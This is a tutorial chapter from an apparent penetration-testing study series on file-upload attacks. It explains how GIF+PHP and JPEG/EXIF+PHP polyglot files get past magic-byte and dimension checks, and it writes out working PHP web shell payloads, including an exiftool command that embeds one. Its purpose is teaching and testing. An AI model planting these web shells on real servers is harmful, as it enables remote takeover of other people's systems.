# 04 — Polyglot File Construction

File 03 covered bypassing checks on file *metadata* (filename, declared Content-Type).
This file covers the next layer: bypassing checks on the file's actual **contents** —
magic byte signatures, structural validation, and dimension checks — by constructing a
single file that is simultaneously, genuinely valid as two different formats.

## What "valid as two formats at once" actually means

A polyglot file isn't a trick or an exploit of a parser bug in the traditional sense —
it's a file engineered so that two completely different parsers, each looking for their
own format's structural rules, both independently conclude "yes, this is a valid file of
my type," while a human (or a script) reading the same bytes with PHP execution in mind
sees a third thing: valid, executable PHP code sitting somewhere inside it.

This works because of a property nearly all binary file formats share: **most parsers
only read as much of the file as they need to**, starting from the front. A JPEG decoder
checks the header signature and any structural markers it cares about, then reads pixel
data — it doesn't necessarily choke on trailing junk or unrecognized metadata fields
sitting in a place the spec allows arbitrary data. A PHP interpreter, conversely, scans
the *entire* file for `<?php ... ?>` tags and executes only what's between them,
completely ignoring any bytes outside those tags, no matter how binary or nonsensical
they look. These two parsing behaviors don't conflict with each other — which is exactly
the gap a polyglot exploits.

---

## Why polyglots specifically defeat magic-byte and structural checks

Recall from File 03's closing section: a server using `getimagesize()`-style checks, or
matching the first few bytes against a known signature (`FF D8 FF` for JPEG, `47 49 46
38 39 61` / `GIF89a` for GIF, `89 50 4E 47` for PNG), can't be fooled by a renamed PHP
file alone — the *bytes themselves* simply don't match the expected signature. A
polyglot defeats this because it genuinely **starts with those exact magic bytes** —
the check isn't being deceived about what it's looking at; it's looking at real,
valid header bytes, just with extra content stashed elsewhere in the file that the
image parser doesn't care about but the PHP interpreter does.

---

## Technique 1: GIF + PHP polyglot

### Mechanism, byte by byte

A GIF file's signature is the literal ASCII text `GIF87a` or `GIF89a` at the very start
of the file. That's it — those 6 bytes are the entire structural requirement most basic
magic-byte checks look for.

```
GIF89a<?php system($_GET['cmd']); ?>
```

Walking through exactly what each component is doing:

- **`GIF89a`** — satisfies any check of the form "do the first 6 bytes equal the GIF
  signature?" A naive magic-byte validator stops here, sees a match, and accepts the
  file as a legitimate GIF.
- **`<?php system($_GET['cmd']); ?>`** — appended immediately after, in the same file.
  The PHP interpreter doesn't care that the file starts with `GIF89a` — when this file is
  later requested and the server is configured to execute `.php` files (achieved via one
  of the extension-bypass techniques from File 03, since the file still needs a usable
  extension), the PHP engine scans the whole file for `<?php ... ?>` tags, finds this
  one, and executes the command, completely indifferent to the `GIF89a` text sitting in
  front of it. PHP simply emits any non-PHP-tagged content as literal output — it
  doesn't fail or refuse to parse a file because of leading garbage.
- This file is **not** a valid, renderable image — it's only "valid" in the narrow sense
  that it satisfies a check that only inspects the first few bytes. If the application
  also tries to actually *render* the image (e.g. generates a thumbnail with an image
  library), that step would likely fail or produce a broken image, which can itself be
  a useful signal during testing — a successful upload that produces a broken thumbnail
  is a strong hint the upload validation is shallower than the rest of the processing
  pipeline expects.

### Why this matters for which check it bypasses

This specific construction defeats a **pure magic-byte signature check** — i.e., "do the
first N bytes match the expected format's header?" It does **not** by itself defeat a
check that calls something like PHP's `getimagesize()`, which tries to parse enough of
the GIF structure to extract width/height — because `GIF89a<?php ...?>` isn't followed by
a syntactically valid GIF logical screen descriptor, so dimension extraction would fail
and a server checking "did we get back valid dimensions?" would reject it. For that
stronger class of check, you need a construction that produces a fully structurally
valid image — which is where the next technique comes in.

---

## Technique 2: JPEG + EXIF metadata polyglot (the exiftool technique)

### Mechanism, piece by piece

JPEG files support embedded metadata via the EXIF standard — structured fields like
camera model, GPS coordinates, and a free-text comment field, all stored inside the
file's own header segments, which sit *before* the actual pixel data. Crucially, this
metadata is part of the **legitimate, specified structure of a real JPEG file** — it's
not a hack or an injection into an otherwise-broken file. A JPEG with EXIF metadata is a
100% valid, perfectly renderable image.

The technique uses the `exiftool` utility to write a PHP payload into one of these
legitimate metadata fields, typically the comment field:

```bash
exiftool -Comment="<?php system(\$_GET['cmd']); ?>" original-image.jpg -o polyglot.jpg
```

What this command does:

- Opens `original-image.jpg`, a genuine, valid JPEG.
- Writes the literal string `<?php system($_GET['cmd']); ?>` into the EXIF Comment
  field — a metadata slot the JPEG spec explicitly allows for arbitrary user text, and
  which the image decoder simply stores/ignores when rendering pixels; it has no
  bearing on whether the image displays correctly.
- Outputs `polyglot.jpg`, which:
  - Still has fully valid `FF D8 FF` JPEG magic bytes.
  - Still has a fully valid, parseable JPEG structure overall — `getimagesize()` would
    successfully return real width/height values, because the actual pixel data segment
    is untouched.
  - **Also contains** a literal PHP tag sitting inside its metadata, which a PHP
    interpreter will find and execute if this file is ever requested with a `.php`
    extension (again, achieved via a File 03 technique) and the server attempts to
    execute it.

### Why this defeats checks that the GIF technique can't

Because the host file is a genuinely structurally valid JPEG (not just a header-matched
blob), this construction survives:

- Magic byte signature checks (the JPEG header is real).
- `getimagesize()`-style dimension extraction (the actual image data is real and
  parses correctly).
- Visual inspection / actually opening the file in an image viewer (it renders as a
  normal-looking photo — the malicious text sits in metadata that most viewers don't
  display prominently, if at all).

It is defeated only by checks that **fully re-encode or strip metadata from uploaded
images** (a common hardening practice — re-saving every uploaded image through a fresh
encoder discards EXIF data entirely, destroying the embedded payload along with all other
metadata) or checks that scan the entire file byte-for-byte for suspicious patterns like
`<?php`.

### Why the extension still has to be solved separately

It's worth restating clearly: **a polyglot file solves the content-validation problem,
not the extension problem.** `polyglot.jpg` is still named `.jpg` — for the embedded PHP
to ever execute, the file still needs to either be saved with (or renamed to, via one of
the File 03 techniques) an executable extension, and still needs to land in a directory
the server is configured to execute scripts from. Polyglots are a *component* of a full
RCE chain, not a complete bypass on their own — File 05 walks through assembling all the
pieces into a working chain end to end.

---

## Other polyglot constructions worth knowing about (briefly)

- **PDF/ZIP polyglots** — exploit the fact that ZIP files are read from the *end* of the
  file (the central directory record is at the tail), while PDF readers look for `%PDF-`
  near the start. A file can be crafted to be both a valid PDF (when opened front-to-back)
  and a valid ZIP archive (when its end-of-file structure is read), useful in contexts
  where an uploaded "PDF" is later also expected to be extractable, or where a different
  processing pipeline treats the same upload as an archive.
- **GIFAR (historical)** — an older technique combining a GIF and a Java JAR/archive
  file, relevant to legacy Java applet-based attack surfaces; mostly of historical
  interest now but illustrates the same general principle (formats parsed from opposite
  ends, or formats that tolerate trailing/leading garbage, are natural polyglot
  candidates).
- **SVG-based attacks** — technically not a magic-byte/polyglot bypass at all, but worth
  flagging here since SVG uploads are commonly grouped with this topic: SVG is an
  XML-based, text format that can legitimately contain `<script>` tags. If an
  application accepts SVG uploads and serves them back from the same origin, this is a
  stored XSS vector (covered by the dedicated XSS material), not an RCE vector — there's
  no polyglot trick needed because the active content is just... valid SVG syntax. It's
  included here only to clarify the boundary: SVG XSS is a content-type-appropriate
  attack, while the GIF/JPEG polyglots above specifically smuggle a *different* format's
  syntax inside an otherwise-legitimate file.

## Real-world note

This exact exiftool-based JPEG polyglot technique traces back to well-documented
real-world incidents and is explicitly referenced in PortSwigger's own file upload
material as the basis for their corresponding lab (see File 06). It remains directly
relevant today against any application that performs magic-byte or dimension-based
image validation without re-encoding uploads — a surprisingly common gap, since
re-encoding costs CPU time and isn't always considered worth the overhead by teams that
believe a signature check is "good enough."
